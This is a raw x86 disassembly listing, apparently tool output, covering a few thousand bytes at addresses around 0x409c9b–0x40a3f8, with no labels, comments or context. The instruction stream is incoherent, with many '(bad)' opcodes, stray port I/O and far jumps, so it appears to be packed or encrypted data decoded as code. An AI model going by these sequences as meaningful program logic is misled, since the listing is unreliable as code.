  409c9b:	ret    0x3baf
  409c9e:	cs xchg edx,eax
  409ca0:	mov    edx,ebx
  409ca2:	sub    ch,al
  409ca4:	mov    dh,0xc1
  409ca6:	cmc    
  409ca7:	pop    ss
  409ca8:	adc    eax,ebp
  409caa:	mov    bl,0x4c
  409cac:	push   0xb7db6db7
  409cb1:	jno    0x409cc7
  409cb3:	dec    ebx
  409cb4:	cmp    edi,DWORD PTR [ebx]
  409cb6:	sub    DWORD PTR [edi-0x727a705b],esp
  409cbc:	ficomp DWORD PTR [eax+0x4]
  409cbf:	xor    eax,0xde6030bd
  409cc4:	sub    dh,dl
  409cc6:	ss stos BYTE PTR es:[edi],al
  409cc8:	push   ecx
  409cc9:	sub    bh,cl
  409ccb:	jp     0x409d41
  409ccd:	or     esi,DWORD PTR [esi-0x7c247f93]
  409cd3:	imul   edx,DWORD PTR [ebx],0x5a
  409cd6:	and    al,BYTE PTR [esi+0x7d2ce3c2]
  409cdc:	ins    DWORD PTR es:[edi],dx
  409cdd:	popa   
  409cde:	stc    
  409cdf:	ret    0x9a21
  409ce2:	sbb    al,0x0
  409ce4:	ins    DWORD PTR es:[edi],dx
  409ce5:	xor    DWORD PTR ss:[ebp+0x62d8dd20],eax
  409cec:	and    DWORD PTR [edi-0x395a13dc],0xb5ab18b0
  409cf6:	jne    0x409c99
  409cf8:	(bad)  [esi+0x134170c4]
  409cfe:	(bad)  
  409cff:	sub    ebx,DWORD PTR [ebx+eiz*2]
  409d02:	add    DWORD PTR [esi*2+0x7773c1a1],ecx
  409d09:	ins    BYTE PTR es:[edi],dx
  409d0a:	and    cl,BYTE PTR fs:[edx-0x25]
  409d0e:	ins    DWORD PTR es:[edi],dx
  409d0f:	arpl   WORD PTR [edi+esi*4-0x2c],dx
  409d13:	fwait
  409d14:	loope  0x409d8f
  409d16:	inc    esp
  409d17:	(bad)  
  409d18:	outs   dx,BYTE PTR ds:[esi]
  409d19:	scas   eax,DWORD PTR es:[edi]
  409d1a:	sbb    bl,al
  409d1c:	push   ss
  409d1d:	xchg   esp,eax
  409d1e:	mov    esi,0xf31726
  409d23:	bound  esi,QWORD PTR [esi+0x31b62d8d]
  409d29:	mov    WORD PTR [eax+esi*8],fs
  409d2c:	inc    ebx
  409d2d:	mov    ebp,0x6b565ff4
  409d32:	sub    al,0x6c
  409d34:	mov    bh,0x25
  409d36:	enter  0x2bb,0xa1
  409d3a:	aaa    
  409d3b:	cs iret 
  409d3d:	lds    esi,FWORD PTR [edi+0x1970b5b2]
  409d43:	mov    bl,0xa6
  409d45:	mov    esi,0x4b02f6f4
  409d4a:	mov    dh,0xda
  409d4c:	mov    dh,0x6d
  409d4e:	or     edi,ebp
  409d50:	out    0xda,al
  409d52:	push   ebp
  409d53:	(bad)  
  409d54:	in     al,dx
  409d55:	fnsave [ecx+ebp*1-0x7d]
  409d59:	mov    dh,0x6d
  409d5b:	xchg   edi,eax
  409d5c:	pop    esp
  409d5d:	inc    esp
  409d5e:	adc    eax,0x8bf2c071
  409d63:	stos   BYTE PTR es:[edi],al
  409d64:	retf   
  409d65:	test   DWORD PTR [ebp-0x7dba8a4a],eax
  409d6b:	sbb    DWORD PTR [edx+edx*4],edx
  409d6e:	call   0x85f9:0x46db0470
  409d75:	pop    ebx
  409d76:	xchg   ecx,eax
  409d77:	xchg   edx,eax
  409d78:	mov    es,WORD PTR [eax]
  409d7a:	jp     0x409d86
  409d7c:	or     al,0xd1
  409d7e:	pop    ecx
  409d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d80:	fld    TBYTE PTR [esi]
  409d82:	sub    al,0xb5
  409d84:	push   ecx
  409d85:	adc    BYTE PTR [edx+ecx*1],0x40
  409d89:	es xor al,0x65
  409d8c:	rcr    BYTE PTR [ecx+0x2d],cl
  409d8f:	(bad)  [edx]
  409d91:	push   ecx
  409d92:	in     eax,dx
  409d93:	out    dx,al
  409d94:	(bad)  
  409d95:	fimul  DWORD PTR [eax]
  409d97:	sub    DWORD PTR [esi-0x61527684],esi
  409d9d:	cmc    
  409d9e:	xchg   edx,eax
  409d9f:	xchg   edi,eax
  409da0:	mov    ah,0xf8
  409da2:	add    BYTE PTR [esi-0x4939e802],ah
  409da8:	rol    dh,1
  409daa:	(bad)  
  409dab:	cld    
  409dac:	nop
  409dad:	push   ebx
  409dae:	mov    WORD PTR [ebx+0x6ed67572],?
  409db4:	in     eax,dx
  409db5:	(bad)  
  409db6:	push   eax
  409db7:	sbb    BYTE PTR [edx+0x76],0xcb
  409dbb:	jmp    0x47ac2dca
  409dc0:	jae    0x409d76
  409dc2:	in     eax,dx
  409dc3:	ret    0x37cc
  409dc6:	loop   0x409e42
  409dc8:	sub    al,0x48
  409dca:	mov    ecx,0xb7280b69
  409dcf:	ins    DWORD PTR es:[edi],dx
  409dd0:	popa   
  409dd1:	pop    edx
  409dd2:	adc    BYTE PTR [eax+0x8],ah
  409dd5:	sub    al,0xc8
  409dd7:	mov    ecx,DWORD PTR [ecx+esi*2-0x5f]
  409ddb:	pop    ebp
  409ddc:	fsubr  DWORD PTR [edx]
  409dde:	and    eax,0x98d55f0d
  409de3:	addr16 inc edx
  409de5:	mov    edx,0xfb5b1bb5
  409dea:	adc    ah,BYTE PTR [eax+0x341d980c]
  409df0:	lahf   
  409df1:	push   cs
  409df2:	push   edx
  409df3:	sub    DWORD PTR [ebp+ecx*4-0x13],0xffffffb6
  409df8:	and    BYTE PTR [ebx-0x52468914],0xe9
  409dff:	pop    ebp
  409e00:	sub    al,0xd3
  409e02:	(bad)  
  409e03:	outs   dx,BYTE PTR ds:[esi]
  409e04:	mov    cl,0x6d
  409e06:	vmread DWORD PTR [eax],esp
  409e09:	mov    es,esi
  409e0b:	ins    BYTE PTR es:[edi],dx
  409e0c:	push   es
  409e0d:	push   cs
  409e0e:	mov    dh,0xca
  409e10:	mov    bh,0xed
  409e12:	mov    dh,0xa5
  409e15:	or     al,0xf4
  409e17:	jecxz  0x409ddd
  409e19:	cmp    BYTE PTR [edx],ah
  409e1b:	add    BYTE PTR [esp+ecx*4-0x7b],cl
  409e1f:	mov    dh,0xb6
  409e21:	fstp   QWORD PTR [ecx-0x44]
  409e24:	mov    esp,0xaa5cc57a
  409e29:	jae    0x409e90
  409e2b:	retf   0x817f
  409e2e:	lea    esp,[edi-0x67]
  409e31:	dec    edx
  409e32:	add    BYTE PTR [edx],bl
  409e34:	cdq    
  409e35:	add    BYTE PTR [esi],ah
  409e37:	add    BYTE PTR cs:[esi],dh
  409e3a:	push   esp
  409e3b:	fcmovnu st,st(2)
  409e3d:	push   ss
  409e3e:	push   ss
  409e3f:	push   0x5e
  409e41:	jl     0x409e0b
  409e43:	and    BYTE PTR [edi-0x72e2195a],bl
  409e49:	mov    dh,0x71
  409e4b:	arpl   WORD PTR [esi+0x5a25885d],si
  409e51:	je     0x409eac
  409e53:	lea    edi,[edx-0x56]
  409e56:	adc    eax,0x99e23fd1
  409e5b:	adc    eax,0xad1b1bf9
  409e60:	push   ecx
  409e61:	add    dl,BYTE PTR [ebp+0x24b20323]
  409e67:	sub    cl,0xb2
  409e6a:	ins    DWORD PTR es:[edi],dx
  409e6b:	dec    ebx
  409e6c:	xor    bl,BYTE PTR [esi-0x33e2ac26]
  409e72:	(bad)  
  409e73:	xchg   edx,eax
  409e74:	sub    DWORD PTR [ebx-0x48],edi
  409e77:	mov    ch,0x5b
  409e79:	add    bh,BYTE PTR [ebx-0x4a]
  409e7c:	or     esp,DWORD PTR [ecx-0x1768b37d]
  409e82:	and    BYTE PTR [esi-0x25925a3f],bh
  409e88:	xor    al,BYTE PTR [esi+0x5]
  409e8b:	cmp    al,BYTE PTR [esi+ebx*4+0x5c5c009d]
  409e92:	pop    ds
  409e93:	push   ss
  409e94:	outs   dx,BYTE PTR ds:[esi]
  409e95:	push   ecx
  409e96:	mov    al,BYTE PTR [edi]
  409e98:	cmp    ch,BYTE PTR [edi-0x7929266b]
  409e9e:	inc    ecx
  409e9f:	mov    al,0xb5
  409ea1:	cld    
  409ea2:	add    al,al
  409ea4:	in     al,dx
  409ea5:	add    dh,bh
  409ea7:	bound  ecx,QWORD PTR [edx+0x3a]
  409eaa:	mov    al,0xc2
  409eac:	(bad)  
  409ead:	(bad)  
  409eae:	ss mov bh,0x4e
  409eb1:	sub    eax,0x361e477d
  409eb6:	or     dl,BYTE PTR [esi]
  409eb8:	ins    DWORD PTR es:[edi],dx
  409eb9:	shr    DWORD PTR [esi-0x25],1
  409ebc:	ret    
  409ebd:	pop    ss
  409ebe:	pop    esp
  409ebf:	push   0x510e2076
  409ec4:	retf   
  409ec5:	ins    DWORD PTR es:[edi],dx
  409ec6:	in     eax,dx
  409ec7:	ret    0xaab6
  409eca:	jl     0x409e64
  409ecc:	cwde   
  409ecd:	mov    ebx,0x50dac8e7
  409ed2:	dec    eax
  409ed3:	push   0xffffffe9
  409ed5:	push   esi
  409ed6:	mov    eax,0x949aa3d7
  409edb:	inc    ecx
  409edc:	arpl   bp,si
  409ede:	retf   
  409edf:	adc    bl,ch
  409ee1:	mov    dh,0xad
  409ee3:	jge    0x409e6f
  409ee5:	push   edi
  409ee6:	sbb    ch,al
  409ee8:	push   cs
  409ee9:	lods   al,BYTE PTR ds:[esi]
  409eea:	and    dh,dl
  409eec:	sbb    eax,0x2b6d9160
  409ef1:	fsub   QWORD PTR [eax-0x4d302b64]
  409ef7:	pop    ds
  409ef8:	lds    edi,FWORD PTR [edi]
  409efa:	adc    al,0x63
  409efc:	popa   
  409efd:	(bad)  [esi-0x7e940fe]
  409f03:	add    al,0xa7
  409f05:	lock and ch,ah
  409f08:	add    ah,bl
  409f0a:	mov    dh,0x76
  409f0c:	popa   
  409f0d:	les    eax,FWORD PTR [edx+0xbbf5a4b]
  409f13:	in     eax,0x8f
  409f15:	std    
  409f16:	xchg   esp,eax
  409f17:	pop    ebp
  409f18:	push   0xffffffb7
  409f1a:	lods   eax,DWORD PTR ds:[esi]
  409f1b:	ds cmp dh,ch
  409f1e:	xor    BYTE PTR [ebp+0x5f],cl
  409f21:	ds jmp 0x409efa
  409f24:	rcl    dl,cl
  409f26:	test   DWORD PTR [ebp-0x6837e24d],ebp
  409f2c:	stos   BYTE PTR es:[edi],al
  409f2d:	push   ss
  409f2e:	and    ch,bh
  409f30:	ret    0xb6f
  409f33:	pop    ss
  409f34:	fisubr DWORD PTR [edx-0x41]
  409f37:	jl     0x409f15
  409f39:	fbstp  TBYTE PTR [ecx]
  409f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f3c:	xor    eax,0x6d4e00b7
  409f41:	fcmovnbe st,st(6)
  409f43:	cs call 0x88f42262
  409f49:	push   esi
  409f4a:	mov    al,0xff
  409f4c:	mov    al,ds:0xb2cb1b6d
  409f51:	mov    edi,0xbd4e7464
  409f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f57:	imul   esp,DWORD PTR [eax],0xfffffff9
  409f5a:	mov    bh,0x2e
  409f5c:	sub    al,0xce
  409f5e:	adc    ch,BYTE PTR [ebx]
  409f60:	jb     0x409ef0
  409f62:	and    eax,0xd57c0006
  409f67:	add    BYTE PTR [eax+0x5b1b4bea],ch
  409f6d:	ins    DWORD PTR es:[edi],dx
  409f6e:	mov    BYTE PTR [edx+edi*8-0x10bb6025],cl
  409f75:	jle    0x409fd2
  409f77:	mov    ebx,0x838ab42d
  409f7c:	sbb    edx,ebp
  409f7e:	and    BYTE PTR [esi-0x9],bl
  409f81:	xor    eax,0x5c2daac2
  409f86:	mov    esi,0xe6ec32b5
  409f8b:	pop    edx
  409f8c:	icebp  
  409f8d:	add    BYTE PTR [eax],dl
  409f8f:	jp     0x409f92
  409f91:	mov    fs,WORD PTR [edi-0x5e8b5248]
  409f97:	or     BYTE PTR [edx],ah
  409f99:	out    dx,al
  409f9a:	xor    ebx,DWORD PTR [eax-0x24443d14]
  409fa0:	(bad)  
  409fa1:	mov    dh,0x2e
  409fa3:	sub    esi,DWORD PTR [edi+0x23298245]
  409fa9:	mov    WORD PTR [ebp-0x47205ffb],gs
  409faf:	mov    al,0x6d
  409fb1:	cmp    eax,DWORD PTR [edx]
  409fb3:	fnstsw WORD PTR [ebx+0x1e19fae5]
  409fb9:	xor    eax,0xb614fa00
  409fbe:	jbe    0x40a01b
  409fc0:	sub    bh,bl
  409fc2:	into   
  409fc3:	mov    esp,cs
  409fc5:	push   0x9bf6179b
  409fca:	popa   
  409fcb:	fcmovnu st,st(0)
  409fcd:	or     ebx,DWORD PTR [edx]
  409fcf:	pop    ebp
  409fd0:	or     BYTE PTR ds:0xa2624cd7,al
  409fd6:	ins    DWORD PTR es:[edi],dx
  409fd7:	mov    eax,ds:0x7deeb689
  409fdc:	in     eax,0xd8
  409fde:	mov    esi,0x8d3ea4f4
  409fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fe4:	(bad)  
  409fe5:	ret    0xed9c
  409fe8:	les    edi,FWORD PTR [esi+0x24]
  409feb:	jecxz  0x409ff3
  409fed:	and    DWORD PTR [eax-0x28],ebx
  409ff0:	fisub  DWORD PTR [ebp-0x2f9391ba]
  409ff6:	jmp    0x38606a72
  409ffb:	mov    ebx,0x1edb697c
  40a000:	or     ch,BYTE PTR [edi]
  40a002:	stos   BYTE PTR es:[edi],al
  40a003:	xchg   ebp,eax
  40a004:	add    esi,DWORD PTR [ecx+0x0]
  40a007:	mov    ecx,esp
  40a009:	mov    ds:0xc2cb2c3b,al
  40a00e:	inc    esi
  40a00f:	xor    DWORD PTR [edx+0xe86927f],0xb965b5b6
  40a019:	sbb    al,0xa8
  40a01b:	mov    eax,0x3f7de0d6
  40a020:	mov    dh,0xc2
  40a022:	rol    dh,cl
  40a024:	ret    0x1062
  40a027:	push   ds
  40a028:	aas    
  40a029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a02a:	cwde   
  40a02b:	outs   dx,DWORD PTR ds:[esi]
  40a02c:	mov    ebp,DWORD PTR [esi+0x5b]
  40a02f:	sbb    ebx,ebx
  40a031:	sti    
  40a032:	or     BYTE PTR [ebx+eax*1+0x36],0xee
  40a037:	clc    
  40a038:	and    BYTE PTR [ecx-0x4c],bl
  40a03b:	sbb    ebp,ebp
  40a03d:	(bad)  
  40a03e:	(bad)  
  40a03f:	xor    eax,0xec3fd87d
  40a044:	or     DWORD PTR [ecx-0x4b4977d3],0x9236b615
  40a04e:	gs aaa 
  40a050:	cmp    edx,DWORD PTR [ebx+0xb6bd250]
  40a056:	pop    ebx
  40a057:	(bad)  
  40a058:	in     eax,dx
  40a059:	jmp    0x40a053
  40a05b:	jge    0x40a065
  40a05d:	jne    0x40a014
  40a05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a060:	and    edx,DWORD PTR cs:[esi+0x444b8de5]
  40a067:	xchg   esp,eax
  40a068:	mov    eax,0x1e00a2ff
  40a06d:	jb     0x409ff9
  40a06f:	push   0x965965db
  40a074:	mov    ds:0x1c3276a8,al
  40a079:	add    ch,BYTE PTR [ebx+0x2c]
  40a07c:	pop    esp
  40a07d:	fsub   DWORD PTR [eax+0x57]
  40a080:	sub    esi,ecx
  40a082:	scas   al,BYTE PTR es:[edi]
  40a083:	xchg   edi,eax
  40a084:	loope  0x40a076
  40a086:	inc    ecx
  40a087:	ins    DWORD PTR es:[edi],dx
  40a088:	retf   
  40a089:	jbe    0x40a0ec
  40a08b:	cmp    al,0x91
  40a08d:	outs   dx,BYTE PTR ds:[esi]
  40a08e:	cmp    al,0x7d
  40a090:	loope  0x40a057
  40a092:	mov    dh,0x93
  40a094:	fcomp  st(2)
  40a096:	test   DWORD PTR [ebp+0x5e0f17f5],ebp
  40a09c:	scas   al,BYTE PTR es:[edi]
  40a09d:	jmp    0xbaf:0xa554650b
  40a0a4:	pop    edi
  40a0a5:	mov    ch,0x52
  40a0a7:	into   
  40a0a8:	add    BYTE PTR [edi+edx*4+0x48f1de27],al
  40a0af:	lds    ebp,FWORD PTR [ebx+0x69]
  40a0b2:	(bad)  [esi-0x79f076a2]
  40a0b8:	cmp    ebx,DWORD PTR [ecx-0x43]
  40a0bb:	inc    ecx
  40a0bc:	jo     0x40a076
  40a0be:	sbb    ebx,DWORD PTR [ebx]
  40a0c0:	fld    TBYTE PTR [ebp-0x62]
  40a0c3:	sbb    dh,BYTE PTR [edx-0x33]
  40a0c6:	add    eax,0x3f2e33ef
  40a0cb:	and    bl,al
  40a0cd:	mov    dh,0xb2
  40a0cf:	sub    al,0x56
  40a0d1:	dec    esi
  40a0d2:	jmp    0xba671e53
  40a0d7:	aad    0x2a
  40a0d9:	sar    esp,1
  40a0db:	push   esi
  40a0dc:	xchg   ecx,eax
  40a0dd:	mov    al,ds:0xb4b2d47a
  40a0e2:	fstp   QWORD PTR [esi]
  40a0e4:	sub    DWORD PTR [ebx+ecx*1-0x4c],ecx
  40a0e8:	pop    ebp
  40a0e9:	push   esi
  40a0ea:	cdq    
  40a0eb:	pop    edi
  40a0ec:	ss sub al,0x6c
  40a0ef:	mov    bh,0x85
  40a0f1:	xchg   esp,eax
  40a0f2:	xor    al,0x6b
  40a0f4:	jmp    0x96b9:0x22582f19
  40a0fb:	ss mov dh,0xad
  40a0fe:	mov    esp,0x1eaba1af
  40a103:	das    
  40a104:	repnz mov eax,0xd8ddb6b7
  40a10a:	pop    esp
  40a10b:	mov    cl,bh
  40a10d:	cli    
  40a10e:	retf   0xd671
  40a111:	lods   eax,DWORD PTR ds:[esi]
  40a112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a113:	popf   
  40a114:	and    DWORD PTR [esi-0x67b04b93],esi
  40a11a:	ror    BYTE PTR [ebx-0x11],1
  40a11d:	int3   
  40a11e:	(bad)  
  40a11f:	and    bl,bh
  40a121:	mov    edi,0xcb942c2e
  40a126:	ds and al,0xc0
  40a129:	mov    ecx,0x3ac21ff0
  40a12e:	rol    BYTE PTR [esi-0x45],1
  40a131:	rcl    ah,1
  40a133:	sub    edx,DWORD PTR [esi+0x34]
  40a136:	mov    bl,0x3f
  40a138:	rcr    BYTE PTR [ebx-0x73],cl
  40a13b:	in     eax,dx
  40a13c:	mov    dh,0x6e
  40a13e:	xor    cl,al
  40a140:	cld    
  40a141:	pop    esi
  40a142:	ja     0x40a1aa
  40a144:	and    al,0xa0
  40a146:	fwait
  40a147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a148:	das    
  40a149:	cs mov ah,0x12
  40a14c:	(bad)  
  40a14e:	dec    edi
  40a14f:	and    BYTE PTR [eax],dh
  40a151:	aas    
  40a152:	add    bl,BYTE PTR [eax-0x26]
  40a155:	sbb    dl,BYTE PTR [edi-0x541fd48a]
  40a15b:	retf   
  40a15c:	nop
  40a15d:	cmp    esp,DWORD PTR [ebx-0x26]
  40a160:	pop    eax
  40a161:	fcomp  DWORD PTR [eax-0x6f]
  40a164:	mov    dh,0x0
  40a166:	adc    bl,ch
  40a168:	sbb    DWORD PTR [edi],edi
  40a16a:	cwde   
  40a16b:	ins    DWORD PTR es:[edi],dx
  40a16c:	imul   esp,DWORD PTR [eax+0x5b],0xffffffc2
  40a170:	jno    0x40a189
  40a172:	popa   
  40a173:	cmp    DWORD PTR [ebp+0x3b],edx
  40a176:	icebp  
  40a177:	and    bl,bl
  40a179:	outs   dx,BYTE PTR ds:[esi]
  40a17a:	lea    ebx,[ebx-0x36]
  40a17d:	push   cs
  40a17e:	cli    
  40a17f:	mov    cl,0xa4
  40a181:	sbb    dh,BYTE PTR [esi+0x58386dfe]
  40a187:	xor    BYTE PTR [ebp-0x28d38693],dh
  40a18d:	xlat   BYTE PTR ds:[ebx]
  40a18e:	jno    0x40a11e
  40a190:	push   edx
  40a191:	jmp    0x55d7e36c
  40a196:	xor    ebx,esp
  40a198:	mov    dl,0x0
  40a19a:	jmp    0xb5b1bc1f
  40a19f:	(bad)  
  40a1a0:	in     eax,dx
  40a1a1:	push   esi
  40a1a2:	aaa    
  40a1a3:	stos   BYTE PTR es:[edi],al
  40a1a4:	fdiv   DWORD PTR [ecx+edi*1-0x5b]
  40a1a8:	loope  0x40a12d
  40a1aa:	mov    eax,0xbcbb5bb5
  40a1af:	cs xchg edi,eax
  40a1b1:	pop    edi
  40a1b2:	stos   BYTE PTR es:[edi],al
  40a1b3:	(bad)  
  40a1b4:	aaa    
  40a1b5:	enter  0x4ae6,0x17
  40a1b9:	ins    BYTE PTR es:[edi],dx
  40a1ba:	in     eax,dx
  40a1bb:	inc    esi
  40a1bc:	pop    ebx
  40a1bd:	scas   eax,DWORD PTR es:[edi]
  40a1be:	or     al,0x62
  40a1c0:	retw   
  40a1c2:	xchg   edx,eax
  40a1c3:	add    eax,0xb1bbc69e
  40a1c8:	mov    ah,0x2d
  40a1ca:	sub    BYTE PTR [edi+0x47],bh
  40a1cd:	or     DWORD PTR ds:0xebf5183d,esi
  40a1d3:	(bad)  
  40a1d4:	in     eax,dx
  40a1d5:	mov    dh,0x6d
  40a1d7:	pop    ebx
  40a1d8:	push   eax
  40a1d9:	adc    al,0xcb
  40a1db:	mul    esi
  40a1dd:	cmc    
  40a1de:	jecxz  0x40a1cd
  40a1e0:	or     edi,DWORD PTR [ebp+0x56]
  40a1e3:	fsubr  DWORD PTR [esi+0x6c]
  40a1e6:	adc    esi,ebp
  40a1e8:	mov    cl,0x8e
  40a1ea:	add    eax,0xef0a59b3
  40a1ef:	mov    eax,0xe8c5b6c0
  40a1f4:	cmp    al,0x41
  40a1f6:	or     ecx,DWORD PTR [eax]
  40a1f8:	imul   ebx,DWORD PTR [ebx],0x54b1b0ac
  40a1fe:	pop    edx
  40a1ff:	ins    DWORD PTR es:[edi],dx
  40a200:	sbb    edi,DWORD PTR [ebp-0x56]
  40a203:	adc    eax,0x2b749248
  40a208:	mov    edi,0xab0b01b1
  40a20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a20e:	adc    al,0x0
  40a210:	cmp    BYTE PTR [ecx],dl
  40a212:	pop    ss
  40a213:	shl    bl,1
  40a215:	ins    DWORD PTR es:[edi],dx
  40a216:	ins    DWORD PTR es:[edi],dx
  40a217:	sub    edx,DWORD PTR [ebx+ebp*1+0x68]
  40a21b:	xor    esi,DWORD PTR [edx]
  40a21d:	xor    DWORD PTR gs:[edx],eax
  40a220:	pop    ebx
  40a221:	mov    ebx,0x422741b1
  40a226:	les    ebp,FWORD PTR [edi]
  40a228:	cmc    
  40a229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a22a:	sub    eax,0x42d2c24b
  40a22f:	loope  0x40a232
  40a231:	inc    edx
  40a232:	mov    al,ds:0x1d4104be
  40a237:	lods   al,BYTE PTR ds:[esi]
  40a238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a239:	in     eax,0x85
  40a23b:	in     eax,dx
  40a23c:	and    ah,dh
  40a23e:	lds    ecx,FWORD PTR [ecx+0x10]
  40a241:	lods   eax,DWORD PTR ds:[esi]
  40a242:	add    BYTE PTR [edi+0x35],cl
  40a245:	pop    ss
  40a246:	sbb    ebx,DWORD PTR [ebx]
  40a248:	lea    ebp,[esi+0x45a36491]
  40a24e:	xchg   DWORD PTR [ebx+0x5bf2dcae],ecx
  40a254:	ins    BYTE PTR es:[edi],dx
  40a255:	sbb    ebx,eax
  40a257:	(bad)  [ebp+0x41]
  40a25a:	adc    ch,BYTE PTR [ebx-0x34]
  40a25d:	add    BYTE PTR [edx+eax*1-0x3e],dh
  40a261:	(bad)  
  40a262:	lea    esi,[esi-0x40cb17ef]
  40a268:	sub    BYTE PTR [ecx-0x45],dl
  40a26b:	dec    ecx
  40a26c:	mov    dh,0x95
  40a26e:	mov    dh,0xdb
  40a270:	pop    es
  40a271:	inc    edi
  40a272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a273:	stos   DWORD PTR es:[edi],eax
  40a274:	outs   dx,BYTE PTR ds:[esi]
  40a275:	scas   eax,DWORD PTR es:[edi]
  40a276:	inc    esp
  40a277:	dec    ebp
  40a278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a279:	sbb    bh,BYTE PTR [esi]
  40a27b:	std    
  40a27c:	call   0x3f477647
  40a281:	arpl   WORD PTR [ebx+esi*4+0x771f659f],bp
  40a288:	mov    dh,0xb0
  40a28a:	mov    al,0x35
  40a28c:	cld    
  40a28d:	clc    
  40a28e:	iret   
  40a28f:	cmp    al,BYTE PTR [eax-0x4964daa2]
  40a295:	or     ebp,DWORD PTR [ebp-0x17]
  40a298:	aad    0x7d
  40a29a:	inc    edi
  40a29b:	push   esp
  40a29c:	jmp    0x5faa6862
  40a2a1:	dec    ebx
  40a2a2:	mov    ebx,0x95d5b1b0
  40a2a7:	jo     0x40a2bc
  40a2a9:	(bad)  
  40a2ab:	pop    ds
  40a2ac:	idiv   BYTE PTR [esi-0x3d1249d7]
  40a2b2:	inc    edx
  40a2b3:	popa   
  40a2b4:	pop    ebx
  40a2b5:	add    DWORD PTR [eax+0x1],edx
  40a2b8:	mov    esp,0xb6f2416f
  40a2bd:	mov    al,0x45
  40a2bf:	fld    TBYTE PTR [edx-0x3227d382]
  40a2c5:	or     eax,0x7941b3bd
  40a2ca:	popa   
  40a2cb:	loope  0x40a2ed
  40a2cd:	imul   bl
  40a2cf:	mov    eax,0xf003891
  40a2d4:	or     ebx,DWORD PTR [ebx+0x1b]
  40a2d7:	or     ebp,DWORD PTR [edx+edi*1-0x11a48dcd]
  40a2de:	fld    DWORD PTR [ebx+0x2c]
  40a2e1:	ins    BYTE PTR es:[edi],dx
  40a2e2:	sbb    ecx,DWORD PTR [ebx+0x77]
  40a2e5:	(bad)  
  40a2e6:	repz xchg edi,eax
  40a2e8:	inc    ecx
  40a2e9:	add    ebp,DWORD PTR [edx+0x64]
  40a2ec:	ret    0xadad
  40a2ef:	add    esi,edi
  40a2f1:	imul   ebp,DWORD PTR gs:[ebx],0xf231e1ec
  40a2f8:	jbe    0x40a2d5
  40a2fa:	retf   0xc52f
  40a2fd:	imul   edx,esp,0x59
  40a300:	nop
  40a301:	or     ecx,ebx
  40a303:	add    BYTE PTR [edi-0x3d24f4fe],dl
  40a309:	dec    ebp
  40a30a:	sar    DWORD PTR [ecx+0x5222ed77],0xff
  40a311:	mov    dh,0x6d
  40a313:	ins    DWORD PTR es:[edi],dx
  40a314:	jmp    0x31fa4d12
  40a319:	into   
  40a31a:	push   ebx
  40a31b:	mov    ecx,0xdb416683
  40a320:	ret    0xc2c6
  40a323:	aaa    
  40a324:	sub    edx,DWORD PTR [edx]
  40a326:	aad    0x48
  40a328:	jg     0x40a2d5
  40a32a:	push   esi
  40a32b:	sub    al,0x85
  40a32d:	in     eax,dx
  40a32e:	(bad)  
  40a32f:	mov    dh,0x45
  40a331:	jmp    0x53c453ca
  40a336:	in     eax,dx
  40a337:	jmp    0x2dfbce7d
  40a33c:	sub    al,0x6d
  40a33e:	pop    ecx
  40a33f:	inc    edi
  40a340:	mov    bl,0xcb
  40a342:	push   ss
  40a343:	call   0xbb4:0x539cfb9e
  40a34a:	in     eax,dx
  40a34b:	inc    esi
  40a34c:	outs   dx,DWORD PTR ds:[esi]
  40a34d:	push   ebp
  40a34e:	lods   eax,DWORD PTR ds:[esi]
  40a34f:	cmc    
  40a350:	mov    dl,0x28
  40a352:	and    DWORD PTR [edi+0x2c2c52b6],edi
  40a358:	icebp  
  40a359:	mov    eax,edi
  40a35b:	cmp    eax,0x3717f588
  40a360:	fdiv   DWORD PTR ss:[esi+0x41472e67]
  40a367:	(bad)  
  40a368:	fstp   QWORD PTR [esi+ebx*4+0x6176b762]
  40a36f:	imul   esp,DWORD PTR [eax],0x59
  40a372:	push   edx
  40a373:	call   0x4fd4:0xb908b5d0
  40a37a:	outs   dx,DWORD PTR cs:[esi]
  40a37c:	dec    ebx
  40a37d:	sbb    eax,esi
  40a37f:	sbb    DWORD PTR [edi+0x7e],0x3b
  40a383:	add    BYTE PTR cs:[esi],bl
  40a386:	aas    
  40a387:	push   cs
  40a388:	mov    ebx,0x5fd5b854
  40a38d:	mov    eax,0x95250357
  40a392:	call   0xda57d358
  40a397:	ins    DWORD PTR es:[edi],dx
  40a398:	jns    0x40a38a
  40a39a:	add    BYTE PTR [esi-0x72],ah
  40a39d:	gs jbe 0x40a368
  40a3a0:	rcr    DWORD PTR [ebp-0x24950656],1
  40a3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3a7:	add    bh,BYTE PTR [eax+0x41]
  40a3aa:	add    al,0x79
  40a3ac:	push   esi
  40a3ad:	shl    ch,0xdb
  40a3b0:	jbe    0x40a415
  40a3b2:	pop    ebx
  40a3b3:	fidiv  DWORD PTR [eax+0x1b6c9c83]
  40a3b9:	push   es
  40a3ba:	mov    edi,0x853d05ca
  40a3bf:	ins    DWORD PTR es:[edi],dx
  40a3c0:	fisttp DWORD PTR [edx-0x5f]
  40a3c3:	pop    edi
  40a3c4:	arpl   WORD PTR [ebx-0x42],dx
  40a3c7:	jecxz  0x40a410
  40a3c9:	mov    esi,DWORD PTR [edi-0xb5a397b]
  40a3cf:	mov    ecx,0x2e2dbdd2
  40a3d4:	cmp    ebp,DWORD PTR [ebx+0x38]
  40a3d7:	and    DWORD PTR [ecx+esi*2-0x4c8de407],edi
  40a3de:	add    BYTE PTR [ebx+0x74],bh
  40a3e1:	add    BYTE PTR [ebx+0x50ed8171],ch
  40a3e7:	add    BYTE PTR [esi-0x491f848b],bl
  40a3ed:	xor    BYTE PTR [ebx-0x3866b6a4],bl
  40a3f3:	je     0x40a438
  40a3f5:	std    
  40a3f6:	in     eax,0xc2
  40a3f8:	push   esi
